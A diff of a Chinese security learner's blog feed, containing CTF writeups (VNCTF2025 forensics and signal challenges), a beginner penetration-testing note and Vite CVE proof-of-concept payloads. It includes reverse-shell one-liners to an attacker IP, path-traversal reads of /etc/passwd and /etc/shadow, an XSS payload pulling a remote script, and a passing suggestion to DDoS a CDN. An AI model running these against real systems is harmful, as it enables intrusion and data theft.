+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180505746.png" alt="image-20250210180505746"></p>
+<h2 id="echo-flowers"><a href="#echo-flowers" class="headerlink" title="echo_flowers"></a>echo_flowers</h2><p>区块链的基本知识和取证搭配的好题。大概?</p>
+<p>给了一个安卓的镜像，先VM开了，不得不吐槽的一点是，操作是真吃力啊。。。</p>
+<p>先放个hint<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180853422.png" alt="image-20250210180853422"></p>
+<p>我没有那么多知识储备，所以其实能用的hint也不多，就一个软件本身没有缓存<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180951701.png" alt="image-20250210180951701"></p>
+<p>看到干干净净的桌面其实就能感觉到不对劲了哈哈，连文件管理都没有还整什么，果断放弃仿真取证。挂DiskGenius</p>
+<p>既然说软件本身没有任何缓存。。那么从哪里入手呢，其实和bashhistory有点相似吧(刚好之前看到过类似的题目)</p>
+<p>也就是，从输入法的缓存，或者说，输入的记录入手。</p>
+<p>定位交给AI<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210181822981.png" alt="image-20250210181822981"></p>
+<p>正好我们是可以找到files这一文件夹的<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210181930421.png" alt="image-20250210181930421"></p>
+<p>接下来一个个看过去其实也可以，最终是可以定位到sgim_gd_usr.bin这个文件的,当然按理来说我们应该先排查.db，.dat，.log这类文件的<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210182036252.png" alt="image-20250210182036252"></p>
+<p>最终找到助记词ranch only space define laundry carpet muscle ramp high twenty couch fashion</p>
+<p>挂上Metamask,记得一定要用没用使用过metamask的浏览器，因为如果你有账户你要导入一般是会让你直接输入密钥登录的</p>
+<p>接下来按照指示输入助记词，重置密码，点击你的账户-&gt;账户详情-&gt;查看密钥就结束了</p>
+<h2 id="ezSignal"><a href="#ezSignal" class="headerlink" title="ezSignal"></a>ezSignal</h2><p>C3师傅的旷世之作(不仅指半夜更新附件)</p>
+<p>当然其实C3师傅给的hint已经相当多了，或者说，都已经把解题步骤告诉你了哈哈(</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183042001.png" alt="image-20250210183042001"></p>
+<p>直接解压会碰到这个问题，那么有人就要问了为什么呢</p>
+<p>查下或者根据提示可以发现包里是有一个名字为空格的文件的，而在Windows系统中这种文件是不会被显示的.当然在不知道这点的前提下，可以观察一下压缩包的结构</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183450579.png" alt="image-20250210183450579"></p>
+<p>可以明显看到frFileNameLength是1，并且文件名显示的是’ ‘</p>
+<p>那么将压缩包复制到Ubuntu</p>
+<pre><code class="highlight bash">unzip ezSignal_fix.zip
+<span class="built_in">mv</span> <span class="string">&#x27; &#x27;</span> 2</code></pre>
+
+<p>再复制回来，010查一下2,<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183802628.png" alt="image-20250210183802628"></p>
+<p>问一下AI，知道是一个grc文件，搭配<a href="https://wiki.gnuradio.org/index.php/InstallingGR">GNU</a>使用，改后缀为grc</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210184040460.png" alt="image-20250210184040460"></p>
+<p>喂AI&#x2F;看hint,这是一个窄带调谐+将复数信号转换为虚部实部分别输出的过程，而我们的任务是逆向一下它，写个Python脚本。(赛后C3说可以Cyber chef，可以Linux。。诶我怎么和我的电脑一个温度了)</p>
+<p>喂了半天ChatGPT报错报了一下午＋一晚上，活全家了哈哈()</p>
+<p>抱着试一试的心情给Deepseek跑了一下，两遍过，最支持国产的一集。。。</p>
+<pre><code class="highlight plaintext">import numpy as np
+from scipy.io import wavfile
+from scipy.signal import butter, lfilter
+
+def read_gr_file(filename, dtype=np.float32, endian=&quot;&lt;&quot;):
+    &quot;&quot;&quot;
+    读取 GRC 生成的二进制文件（如 blocks_file_sink 的输出）
+    - dtype: 数据类型（默认 float32）
+    - endian: 字节序（默认小端序 &quot;&lt;&quot;，大端序用 &quot;&gt;&quot;）
+    &quot;&quot;&quot;
+    # 以二进制模式读取文件
+    with open(filename, &quot;rb&quot;) as f:
+        raw_bytes = f.read()
+    
+
+# 转换为指定字节序和类型的 numpy 数组
+
+dt = np.dtype(f&quot;&#123;endian&#125;&#123;dtype().dtype.char&#125;&quot;)
+data = np.frombuffer(raw_bytes, dtype=dt)
+return data
+
+def main():
+
+    # 参数配置（与 GRC 一致）
+
+     samp_rate = 48000      # 音频采样率
+     if_rate = 192000       # 中频速率（usrp_rate/3 = 576000/3）
+     max_dev = 5e3          # FM最大频偏
+     endian = &quot;&lt;&quot;           # 字节序（GRC 默认小端序）
+
+try:
+
+    # 1. 读取I/Q数据（二进制模式）
+
+     i_data = read_gr_file(&quot;flag1.txt&quot;, dtype=np.float32, endian=endian)
+     q_data = read_gr_file(&quot;flag2.txt&quot;, dtype=np.float32, endian=endian)
+
+    # 检查长度一致性
+
+     if len(i_data) != len(q_data):
+         raise ValueError(&quot;I/Q数据长度不一致！&quot;)
+
+    # 2. 合并为复数信号（I + jQ）
+
+     complex_signal = i_data + 1j * q_data
+
+    # 3. FM解调（相位差分法）
+
+     phase = np.unwrap(np.angle(complex_signal))
+     demodulated = np.diff(phase) / (2 * np.pi * max_dev) * if_rate
+     demodulated = demodulated.astype(np.float32)
+
+    # 4. 重采样到音频采样率（48 kHz）
+
+     demodulated_resampled = demodulated[::4]  # 简单下采样
+
+    # 5. 低通滤波（300-5000 Hz，与GRC一致）
+
+     b, a = butter(4, 5000, fs=samp_rate, btype=&#x27;low&#x27;)
+     demodulated_resampled = lfilter(b, a, demodulated_resampled)
+
+    # 6. 归一化并保存为WAV
+
+     demodulated_resampled /= np.max(np.abs(demodulated_resampled)) * 1.2
+     wavfile.write(&quot;flag_recovered.wav&quot;, samp_rate, demodulated_resampled)
+
+     print(&quot;还原成功！保存为 flag_recovered.wav&quot;)
+
+except FileNotFoundError:
+    print(&quot;错误：未找到 flag1.txt 或 flag2.txt！&quot;)
+except Exception as e:
+    print(f&quot;错误：&#123;str(e)&#125;&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    main()</code></pre>
+
+<p>得到一个92.7MB的wav，那其实一想就是SSTV了，用RX-SSTV跑一下</p>
+<p>得到一张阿兹特克码，扫一下得到flag<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/2025-02-09_09.53.19.jpg" alt="2025-02-09_09.53.19"></p>
+<p>唉，不能老实做传统misc了,不去折腾研究一些东西感觉永远都只能是入门仔了。也算是吃一堑长一智吧。</p>
+]]></content>
+      <tags>
+        <tag>-CTF -Writeup</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>TGCTF_Writeup</title>
     <url>/2025/04/18/TGCTF-Writeup/</url>
     <content><![CDATA[<h1 id="TGCTF2025"><a href="#TGCTF2025" class="headerlink" title="TGCTF2025"></a>TGCTF2025</h1><p>这比赛说他好吧，确实让我发现自己的知识点漏洞有多大(哈哈，还是过过的知识点，恨不得给自己一巴掌，差点就可以卷铺盖走人了)。说差，你吗的前端游戏我一直以为题目就是那个错误页面，第二天又开才发现是正常的前端游戏，构式靶机。。。还有一堆莫名其妙的脑洞和对电波环节，有点。。了吧</p>
@@ -4569,192 +4691,98 @@ black_list=[<span class="string">&#x27;lipsum&#x27;</span>,<span class="string">
       </tags>
   </entry>
   <entry>
-    <title>VNCTF2025</title>
-    <url>/2025/02/10/VNCTF2025/</url>
-    <content><![CDATA[<h1 id="VNCTF-2025"><a href="#VNCTF-2025" class="headerlink" title="VNCTF 2025"></a>VNCTF 2025</h1><p>入坑CTF以来打过最难的个人赛，打完的表情就像先辈的一张表情包一样</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/e7584e8da9773912fec999bbbd198618347ae2dc.jpg" alt="img"></p>
-<p>比赛期间就出了一题，这才是正统misc吗哈哈(</p>
-<h2 id="VN-Lang"><a href="#VN-Lang" class="headerlink" title="VN_Lang"></a><strong>VN_Lang</strong></h2><p>不能较真的签到题，附件一个exe,一个莫名其妙的源代码。看起来花里胡哨，实际010一查就出来了</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180505746.png" alt="image-20250210180505746"></p>
-<h2 id="echo-flowers"><a href="#echo-flowers" class="headerlink" title="echo_flowers"></a>echo_flowers</h2><p>区块链的基本知识和取证搭配的好题。大概?</p>
-<p>给了一个安卓的镜像，先VM开了，不得不吐槽的一点是，操作是真吃力啊。。。</p>
-<p>先放个hint<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180853422.png" alt="image-20250210180853422"></p>
-<p>我没有那么多知识储备，所以其实能用的hint也不多，就一个软件本身没有缓存<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180951701.png" alt="image-20250210180951701"></p>
-<p>看到干干净净的桌面其实就能感觉到不对劲了哈哈，连文件管理都没有还整什么，果断放弃仿真取证。挂DiskGenius</p>
-<p>既然说软件本身没有任何缓存。。那么从哪里入手呢，其实和bashhistory有点相似吧(刚好之前看到过类似的题目)</p>
-<p>也就是，从输入法的缓存，或者说，输入的记录入手。</p>
-<p>定位交给AI<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210181822981.png" alt="image-20250210181822981"></p>
-<p>正好我们是可以找到files这一文件夹的<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210181930421.png" alt="image-20250210181930421"></p>
-<p>接下来一个个看过去其实也可以，最终是可以定位到sgim_gd_usr.bin这个文件的,当然按理来说我们应该先排查.db，.dat，.log这类文件的<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210182036252.png" alt="image-20250210182036252"></p>
-<p>最终找到助记词ranch only space define laundry carpet muscle ramp high twenty couch fashion</p>
-<p>挂上Metamask,记得一定要用没用使用过metamask的浏览器，因为如果你有账户你要导入一般是会让你直接输入密钥登录的</p>
-<p>接下来按照指示输入助记词，重置密码，点击你的账户-&gt;账户详情-&gt;查看密钥就结束了</p>
-<h2 id="ezSignal"><a href="#ezSignal" class="headerlink" title="ezSignal"></a>ezSignal</h2><p>C3师傅的旷世之作(不仅指半夜更新附件)</p>
-<p>当然其实C3师傅给的hint已经相当多了，或者说，都已经把解题步骤告诉你了哈哈(</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183042001.png" alt="image-20250210183042001"></p>
-<p>直接解压会碰到这个问题，那么有人就要问了为什么呢</p>
-<p>查下或者根据提示可以发现包里是有一个名字为空格的文件的，而在Windows系统中这种文件是不会被显示的.当然在不知道这点的前提下，可以观察一下压缩包的结构</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183450579.png" alt="image-20250210183450579"></p>
-<p>可以明显看到frFileNameLength是1，并且文件名显示的是’ ‘</p>
-<p>那么将压缩包复制到Ubuntu</p>
-<pre><code class="highlight bash">unzip ezSignal_fix.zip
-<span class="built_in">mv</span> <span class="string">&#x27; &#x27;</span> 2</code></pre>
+    <title>一个飞舞的渗透学习实录</title>
+    <url>/2025/05/08/%E4%B8%80%E4%B8%AA%E9%A3%9E%E8%88%9E%E7%9A%84%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95/</url>
+    <content><![CDATA[<p>—–不知道怎么形容，就叫做一个飞舞的渗透实录吧，飞舞挺飞舞的，学也真在学，唉唉，很难不着急(又幻想了，幻想不被后面来的web手打飞)，道心或许多多少少有点乱了，传统web基础有点学不进去了，搞点渗透调整一下状态吧，也刚好之后有个AWD可以练一下(我绝对不会说是为了AWD才提前开始学的。。)</p>
+<p>大概会持续更新吧嗯嗯，毕竟一朝一夕也学不完的</p>
+<h1 id="一个飞舞的渗透学习实录"><a href="#一个飞舞的渗透学习实录" class="headerlink" title="一个飞舞的渗透学习实录"></a>一个飞舞的渗透学习实录</h1><p>首先必须了解的就是一个完整的渗透测试的基本流程啦。。</p>
+<p>根据网上可考资料，渗透大概分成这样几个流程</p>
+<pre><code class="highlight plaintext">信息收集/外网打点
+内网渗透
+权限维持
+横向移动</code></pre>
 
-<p>再复制回来，010查一下2,<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183802628.png" alt="image-20250210183802628"></p>
-<p>问一下AI，知道是一个grc文件，搭配<a href="https://wiki.gnuradio.org/index.php/InstallingGR">GNU</a>使用，改后缀为grc</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210184040460.png" alt="image-20250210184040460"></p>
-<p>喂AI&#x2F;看hint,这是一个窄带调谐+将复数信号转换为虚部实部分别输出的过程，而我们的任务是逆向一下它，写个Python脚本。(赛后C3说可以Cyber chef，可以Linux。。诶我怎么和我的电脑一个温度了)</p>
-<p>喂了半天ChatGPT报错报了一下午＋一晚上，活全家了哈哈()</p>
-<p>抱着试一试的心情给Deepseek跑了一下，两遍过，最支持国产的一集。。。</p>
-<pre><code class="highlight plaintext">import numpy as np
-from scipy.io import wavfile
-from scipy.signal import butter, lfilter
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>信息收集能力，唉唉，你做web哪个不要信息收集，这东西确实需要好好训练一下</p>
+<h3 id="正面信息收集"><a href="#正面信息收集" class="headerlink" title="正面信息收集"></a>正面信息收集</h3><h4 id="网页信息"><a href="#网页信息" class="headerlink" title="网页信息"></a>网页信息</h4><p>在浏览网页的时候，有时可以拿到一些有用的信息的</p>
+<ul>
+<li>网页的URL:可能会暴露使用的脚本语言，再向下观察网站是否有在线客服窗口，网站底部你可能在网站页面观察到的信息有：URL信息（1.例如使用的OA.xxxcom2.使用的脚本语言）、在线客服、技术支持、关于公司的联系方式（邮箱、电话号码、工作地点等）、备案号、营业执照、后台登录接口、友情链接、某些二维码等。而且你抓包基本上也能抓到底层脚本语言的&#x2F;搂出底层框架的</li>
+</ul>
+<h4 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h4><p>可以先根据域名摸出来对应的IP(工具：<code>nslookup、ip138</code>)</p>
+<p>或者ping一下也能摸到ip，但是只能摸到一个IP(<strong>CDN</strong>的，但是我们要找的是真实的IP)</p>
+<p>所以要用超级PING(<code>itdog.com</code>)</p>
+<p>而要绕过IDN，需要ping一个不存在的二级域名，用邮箱(有自动回复就直接打掉了)或者用海外PING</p>
+<pre><code class="highlight plaintext">不太文明的方法。。用DdOS直接把CDN打掉</code></pre>
 
-def read_gr_file(filename, dtype=np.float32, endian=&quot;&lt;&quot;):
-    &quot;&quot;&quot;
-    读取 GRC 生成的二进制文件（如 blocks_file_sink 的输出）
-    - dtype: 数据类型（默认 float32）
-    - endian: 字节序（默认小端序 &quot;&lt;&quot;，大端序用 &quot;&gt;&quot;）
-    &quot;&quot;&quot;
-    # 以二进制模式读取文件
-    with open(filename, &quot;rb&quot;) as f:
-        raw_bytes = f.read()
-    
+<p><strong>端口</strong></p>
+<p>​	一个网站会开放多个端口，而我们可以通过同一网站的不同端口进行测试，扫描开放端口的方法有很多，方便的话是利用工具扫描端口，其次是用在线的端口扫描网站。端口扫描工具推荐有<code>nmap,goby</code>等</p>
+<p><strong>子域名</strong>&#x2F;<strong>资产测绘</strong></p>
+<p>​	收集子域名可以扩大测试的范围，统一域名下的二级域名都属于目标范围</p>
+<p>介绍一下子域名的相关概念</p>
+<pre><code class="highlight plaintext">顶级域名(一级域名/父域名)是类似于.com .net .org .cn之类
+其次的就要从右向左把优先度下降
+例如下面这两个域名:mail.example.com  calendar.example.com
+他们是example.com的两个子域，而example.com则是顶级域.com的子域</code></pre>
 
-# 转换为指定字节序和类型的 numpy 数组
+<p>常见的子域名爆破工具：<code>oneforall、layer子域名挖掘机、SubDomainsBrute</code></p>
+<p>用<strong>fofa,hunter</strong></p>
+<p><strong>C段旁注</strong></p>
+<blockquote>
+<p>那我问你，C段是什么</p>
+</blockquote>
+<p>一个IP地址可以这样分解:</p>
+<pre><code class="highlight plaintext">192.168.0.1
+A  | B |C|D</code></pre>
 
-dt = np.dtype(f&quot;&#123;endian&#125;&#123;dtype().dtype.char&#125;&quot;)
-data = np.frombuffer(raw_bytes, dtype=dt)
-return data
+<p>一般C段指的是同一内网段下的其他服务器，也就是说是D段1-255中的一台服务器，C段入侵其实就是从其他服务器出发进行测试</p>
+<pre><code class="highlight plaintext">测试工具:Nmap</code></pre>
 
-def main():
+<hr>
+<p>旁站就是要从同一服务器下的不同网站进行提权拿下服务器从而达到拿下所有网站的目的</p>
+<p>也可以用扫描器</p>
+<pre><code class="highlight plaintext">fscan,dddd,ez,fscanx,milkyway,xway,灯塔//fscan和nmap有些臭名昭著了，别用少用</code></pre>
 
-    # 参数配置（与 GRC 一致）
+<p><strong>用户</strong></p>
+<p>收集用户的信息</p>
+<h4 id="资产查询"><a href="#资产查询" class="headerlink" title="资产查询"></a>资产查询</h4><p>公司名-&gt;ICP备案-&gt;子域名-&gt;IP</p>
+<p>看招标文件找供应商-&gt;打进政府云</p>
+<h4 id="敏感目录"><a href="#敏感目录" class="headerlink" title="敏感目录"></a>敏感目录</h4><p>这个很经典了，平常刷刷题目都会碰到的程度</p>
+<p><code>dirsearch</code>一般来说够用，不多赘述</p>
+<p>关注一下这些能进去的目录&#x2F;可以传参的一些带有特殊功能的页面</p>
+<pre><code class="highlight plaintext">任意文件下载
+后台
+未授权访问
+敏感信息泄露
+SQL注入</code></pre>
 
-     samp_rate = 48000      # 音频采样率
-     if_rate = 192000       # 中频速率（usrp_rate/3 = 576000/3）
-     max_dev = 5e3          # FM最大频偏
-     endian = &quot;&lt;&quot;           # 字节序（GRC 默认小端序）
+<h4 id="web组件"><a href="#web组件" class="headerlink" title="web组件"></a>web组件</h4><p>​        各种web组件组合构成网站。</p>
+<p>操作系统<br>        网站服务器有不同的操作系统：<code>windows、Linux、mac os</code>这里需要知道的是windows对大小写不敏感，其他两个对大小写敏感就行了。</p>
+<p>（2）数据库<br>        目前比较常用的数据库有<code>:MySQL、SQL server、Oracle</code>等。SQL server开放的默认端口：1433，MySQL开放的默认端口：3306、Oracle开放的默认端口：1521。</p>
+<p>（3）容器<br>        目前比较常见的web中间件有：<code>IIS(iis解析漏洞)，apache，tcmact，nginx，jboss</code>等。</p>
+<p>（4）CMS<br>        <code>cms</code>有很多，这里就列举一部分例子：<code>dedeCMS</code>、 帝国CMS等。</p>
+<p>（5）web框架<br>        web框架有<code>struts1</code>、<code>Struts2</code>、<code>Spring MVC</code>等（框架漏洞）</p>
+<p>（6）web组件识别<br>        web组件识别（web指纹识别）一般可以识别出以上的网站基础信息。web指纹识别我分为在线扫描与工具识别。在线扫描的网站有：潮汐指纹识别<code>TideFinger</code> 潮汐指纹、云悉指纹yunsee.cn-2.0、强大的网站信息扫描网网站基础信息获取 - <code>ThreatScan</code> - 免费的网站在线安全检测平台-<code>TScan</code>；</p>
+<p>web指纹识别工具：御剑、北极熊扫描器等；指纹识别插件有<code>wappalyzer</code>。</p>
+<h3 id="侧面信息收集"><a href="#侧面信息收集" class="headerlink" title="侧面信息收集"></a>侧面信息收集</h3><h4 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h4><p>​     得到目标URL之后，我们可以通过站长之家来进行whios查询这家公司的信息。例如：公司名称，注册人或者机构、联系方式：邮箱，手机号码，备案号，ip，域名，DNS，少量子域名等。</p>
+<h4 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h4><p>​    常用的空间搜索引擎一般有：FOFA、shodan、zoomeye。其中FOFA一般搜索到的是一些网站的信息，收集到的偏软件类信息比较多；而shodan和zoomeye则是搜索网络在线设备信息，偏向于收集硬件的信息。具体使用规则需要自己去摸索。</p>
+<h4 id="Google搜索"><a href="#Google搜索" class="headerlink" title="Google搜索"></a>Google搜索</h4><p>​        Google语法是最强大的搜索手段之一，你可以收集到一些敏感页面、敏感目录、网站内可下载的文件、可能出现的sql注入点和文件上传点、未授权访问页面等。</p>
+<h4 id="WAF探测"><a href="#WAF探测" class="headerlink" title="WAF探测"></a>WAF探测</h4><p>​        通过识别网站是否存在WAF以及网站存在什么样的WAF，根据自己的水平（能否绕过此类WAF）来决定还应不应该花时间耗在绕WAF上（不仅限于参加比赛）。</p>
+<h4 id="一些不经常用的技巧"><a href="#一些不经常用的技巧" class="headerlink" title="一些不经常用的技巧"></a>一些不经常用的技巧</h4><pre><code class="highlight plaintext">查看github平台上有无类似本网站的源码，敏感信息，登陆的账号密码等
+社工
+钓鱼
+SSL证书查询</code></pre>
 
-try:
+<h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>首先你要学会弹shell</p>
+<pre><code class="highlight plaintext">nc:
+攻击机:nc -lvvp [端口]
+目标机nc &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e /bin/bash
 
-    # 1. 读取I/Q数据（二进制模式）
+bash:
+攻击机:nc -lvvp [端口]
+目标机:bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</code></pre>
 
-     i_data = read_gr_file(&quot;flag1.txt&quot;, dtype=np.float32, endian=endian)
-     q_data = read_gr_file(&quot;flag2.txt&quot;, dtype=np.float32, endian=endian)
-
-    # 检查长度一致性
-
-     if len(i_data) != len(q_data):
-         raise ValueError(&quot;I/Q数据长度不一致！&quot;)
-
-    # 2. 合并为复数信号（I + jQ）
-
-     complex_signal = i_data + 1j * q_data
-
-    # 3. FM解调（相位差分法）
-
-     phase = np.unwrap(np.angle(complex_signal))
-     demodulated = np.diff(phase) / (2 * np.pi * max_dev) * if_rate
-     demodulated = demodulated.astype(np.float32)
-
-    # 4. 重采样到音频采样率（48 kHz）
-
-     demodulated_resampled = demodulated[::4]  # 简单下采样
-
-    # 5. 低通滤波（300-5000 Hz，与GRC一致）
-
-     b, a = butter(4, 5000, fs=samp_rate, btype=&#x27;low&#x27;)
-     demodulated_resampled = lfilter(b, a, demodulated_resampled)
-
-    # 6. 归一化并保存为WAV
-
-     demodulated_resampled /= np.max(np.abs(demodulated_resampled)) * 1.2
-     wavfile.write(&quot;flag_recovered.wav&quot;, samp_rate, demodulated_resampled)
-
-     print(&quot;还原成功！保存为 flag_recovered.wav&quot;)
-
-except FileNotFoundError:
-    print(&quot;错误：未找到 flag1.txt 或 flag2.txt！&quot;)
-except Exception as e:
-    print(f&quot;错误：&#123;str(e)&#125;&quot;)
-
-if __name__ == &quot;__main__&quot;:
-    main()</code></pre>
-
-<p>得到一个92.7MB的wav，那其实一想就是SSTV了，用RX-SSTV跑一下</p>
-<p>得到一张阿兹特克码，扫一下得到flag<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/2025-02-09_09.53.19.jpg" alt="2025-02-09_09.53.19"></p>
-<p>唉，不能老实做传统misc了,不去折腾研究一些东西感觉永远都只能是入门仔了。也算是吃一堑长一智吧。</p>
-]]></content>
+<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><h2 id="清除痕迹擦屁股"><a href="#清除痕迹擦屁股" class="headerlink" title="清除痕迹擦屁股"></a>清除痕迹<del>擦屁股</del></h2>]]></content>
       <tags>
-        <tag>-CTF -Writeup</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Vite相关CVE</title>
-    <url>/2025/04/16/Vite%E7%9B%B8%E5%85%B3CVE/</url>
-    <content><![CDATA[<h1 id="Vite相关CVE"><a href="#Vite相关CVE" class="headerlink" title="Vite相关CVE"></a>Vite相关CVE</h1><p>TG遇到了Vite这个东西，出了三个前端的cve题目，都是很新鲜的cve，因此想着了解一下Vite相关的cve，复现可能要等后面学了ts再看了唉唉。。</p>
-<h2 id="CVE-2022-35204"><a href="#CVE-2022-35204" class="headerlink" title="CVE-2022-35204"></a>CVE-2022-35204</h2><p>Vite的一个任意文件读取漏洞</p>
-<p>vite 默认启用的 <code>/@fs/</code> 路由用于访问任意本地文件</p>
-<p>但是正常访问是会被block的</p>
-<p>但是可以利用<code>../</code>绕过进行任意文件读</p>
-<p>目前还未复现，贴上别的师傅打好的poc</p>
-<pre><code class="highlight plaintext">curl --path-as-is http://localhost:3000/@fs/home/swwind/tmp/cve/CVE-2022-35204/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/hosts
-//原链接 https://blog.sww.moe/post/exploits/cve-2022-35204/</code></pre>
-
-<p>这个漏洞的成因大概就是decodeURI这个函数的漏洞</p>
-<pre><code class="highlight plaintext">decodeURI在解码时会将大部分的ASCII标点符号和预留字符保留不变，包括/和%2f
-这样就会导致/../未被检测到而绕过了安全检测
-传入的/home/swwind/tmp/cve/CVE-2022-35204/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/hosts 的时候，decodeURI 函数解析出来的结果会保留其中的所有 %2f，再经由下一步的 path.resolve 函数解析，最终结果是 /home/swwind/tmp/cve/CVE-2022-35204/..%2f..%2f..%2f..%2f../etc/hosts，由此非常轻松地就绕过了 vite 的允许目录检查。</code></pre>
-
-<p>相比之下，decodeURIcomponent就要好一些，因为其解码 URI 组件中的字符，而不是完整的 URI。它可以正确解码任何 ASCII 字符或 UTF-8 字符集，包括默认 URI 编码中使用的所有预留字符和其他特殊字符</p>
-<p>在decodeURIcomponent的处理后，传入的参数被解析为<code>/home/swwind/tmp/cve/CVE-2022-35204/../../../../../etc/hosts</code>，会被正确过滤为<code>/etc/hosts</code>，从而防御了任意文件读取</p>
-<h2 id="CVE-2023-49293"><a href="#CVE-2023-49293" class="headerlink" title="CVE-2023-49293"></a>CVE-2023-49293</h2><p>Vite的一个XSS漏洞</p>
-<p>复现可能要回头了把<a href="https://github.com/vitejs/vite/security/advisories/GHSA-92r3-m2mg-pj97">XSS vulnerability in <code>server.transformIndexHtml</code> via URL payload · Advisory · vitejs&#x2F;vite · GitHub</a></p>
-<p>poc就是直接在后面query打一个普通的反射xss语句，直接弹</p>
-<pre><code class="highlight plaintext">?%22%3E%3C/script%3E%3Cscript%3Ealert(%27boom%27)%3C/script%3E
-//?&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(&#x27;boom&#x27;)&lt;/script&gt;</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250416124525018.png" alt="image-20250416124525018"></p>
-<p>再尝试构造弹了一下</p>
-<pre><code class="highlight plaintext">?&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://71g9hx8u.requestrepo.com/&quot;;&gt; &lt; /script&gt;</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250416125624323.png" alt="image-20250416125624323"></p>
-<h2 id="CVE-2025-30208"><a href="#CVE-2025-30208" class="headerlink" title="CVE-2025-30208"></a>CVE-2025-30208</h2><p>还是相同的<code>@fs</code>的利用</p>
-<p>这边贴poc，回头会补复现</p>
-<pre><code class="highlight plaintext">/@fs/etc/passwd?import&amp;raw??
-/@fs/etc/passwd?raw??</code></pre>
-
-<p><a href="https://www.xaitx.com/tech/2025-03-26.html">Vite 任意文件读取漏洞分析复现（CVE-2025-30208） | 小艾博客</a></p>
-<h2 id="CVE-2025-31125"><a href="#CVE-2025-31125" class="headerlink" title="CVE-2025-31125"></a>CVE-2025-31125</h2><p>这个洞是利用inline的规则配合.wsam进行绕过(是对上一个CVE的补丁的绕过)</p>
-<pre><code class="highlight plaintext">/@fs/C://windows/win.ini?import&amp;inline=1.wasm?init
-还有两个下面那个大佬打出来的未公开poc//适用6.2.4
-/@fs/etc/passwd?import&amp;?meteorkai.svg?.wasm?init
-/@fs/etc/shadow?meteorkai.svg?.wasm?init  //这里没有import是因为读取的文件没有后缀，isJSRequest为true</code></pre>
-
-<p>这边引用一下大佬的解释好了</p>
-<pre><code class="highlight plaintext">除了?url和?raw还有一种内联的方法?inline，他的作用是：
-将文件（如图片、字体、WASM 等）的内容转换为 Base64 编码字符串 或 直接嵌入到 JS/HTML/CSS 中，避免额外的 HTTP 请求
-?init主要用于 WebAssembly（.wasm）文件的初始化，默认只有.wasm支持?init其他如.data、.bin可以通过插件拓展支持
-通过这种新的方法绕过了修复后的正则过滤
-//原链接https://cloud.tencent.com/developer/article/2513407</code></pre>
-
-<p><a href="https://xz.aliyun.com/news/17655">Vite开发服务器任意文件读取漏洞分析复现（CVE-2025-31125）-先知社区</a></p>
-<h2 id="CVE-2025-31486"><a href="#CVE-2025-31486" class="headerlink" title="CVE-2025-31486"></a>CVE-2025-31486</h2><p>先贴出poc</p>
-<pre><code class="highlight plaintext">/etc/passwd?.svg?.wasm?init
-/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw</code></pre>
-
-<p><a href="https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x">原链</a></p>
-<p>其中第二个poc是需要先探出大概的路径才能打的</p>
-<p><a href="https://xz.aliyun.com/news/17730">Vite开发服务器任意文件读取漏洞分析复现（CVE-2025-31486）-先知社区</a></p>
-<h2 id="CVE-2025-32395"><a href="#CVE-2025-32395" class="headerlink" title="CVE-2025-32395"></a>CVE-2025-32395</h2><p>poc</p>
